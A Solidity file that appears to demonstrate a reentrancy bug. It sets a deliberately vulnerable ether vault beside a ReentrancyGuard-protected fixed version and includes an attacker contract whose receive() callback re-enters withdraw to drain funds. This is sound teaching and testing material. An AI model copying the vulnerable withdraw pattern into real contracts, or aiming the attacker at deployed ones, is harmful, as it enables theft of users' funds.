// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { ReentrancyGuard } from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract VulnerableEthVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "none");
        (bool success,) = msg.sender.call{ value: amount }("");
        require(success, "transfer failed");
        balances[msg.sender] = 0;
    }
}

contract FixedEthVault is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "none");
        balances[msg.sender] = 0;
        (bool success,) = msg.sender.call{ value: amount }("");
        require(success, "transfer failed");
    }
}

contract ReentrancyAttacker {
    VulnerableEthVault public vulnerable;
    FixedEthVault public fixedVault;
    uint256 public attacks;

    constructor(VulnerableEthVault vulnerable_, FixedEthVault fixedVault_) {
        vulnerable = vulnerable_;
        fixedVault = fixedVault_;
    }

    receive() external payable {
        if (address(vulnerable).balance >= 1 ether && attacks < 2) {
            attacks++;
            vulnerable.withdraw();
        }
    }

    function attackVulnerable() external payable {
        vulnerable.deposit{ value: msg.value }();
        vulnerable.withdraw();
    }

    function attackFixed() external payable {
        fixedVault.deposit{ value: msg.value }();
        fixedVault.withdraw();
    }
}
